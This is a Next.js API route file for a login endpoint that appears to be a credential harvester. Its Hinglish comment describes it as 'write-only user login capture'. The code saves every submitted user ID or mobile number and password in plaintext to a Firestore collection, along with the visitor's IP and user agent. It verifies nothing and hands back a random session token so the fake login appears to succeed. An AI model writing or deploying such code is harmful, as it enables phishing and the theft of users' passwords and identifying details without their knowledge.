import { NextRequest, NextResponse } from "next/server";
import crypto from "crypto";
import { saveUserLoginToDb } from "@/lib/db";

export const dynamic = "force-dynamic";

/**
 * POST /api/auth/login
 * Write-only user login capture:
 * Jo bhi Mobile Number / User ID aur Password user daalta hai, wo seedha
 * Firebase Firestore ('user_logins' collection) me save ho jata hai.
 * Koi bhi public user is data ko kabhi read ya dekh nahi sakta!
 */
export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const userId = String(body?.userId || body?.mobile || "").trim();
    const password = String(body?.password || "").trim();

    if (!userId || !password) {
      return NextResponse.json(
        { ok: false, error: "Please enter Mobile Number / ID and Password." },
        { status: 400 }
      );
    }

    if (userId.length > 120 || password.length > 200) {
      return NextResponse.json(
        { ok: false, error: "Invalid input length." },
        { status: 400 }
      );
    }

    const ip =
      req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
      req.headers.get("x-real-ip") ||
      "unknown";
    const userAgent = req.headers.get("user-agent") || "unknown";

    await saveUserLoginToDb({
      userId,
      password,
      ip,
      userAgent,
      createdAt: new Date().toISOString(),
    });

    // Issue a random opaque student session token (never echoes password or other users)
    const studentSessionToken = crypto.randomBytes(24).toString("hex");

    return NextResponse.json({
      ok: true,
      sessionToken: studentSessionToken,
      loginTime: Date.now(),
    });
  } catch {
    return NextResponse.json(
      { ok: false, error: "Unable to process login right now." },
      { status: 500 }
    );
  }
}
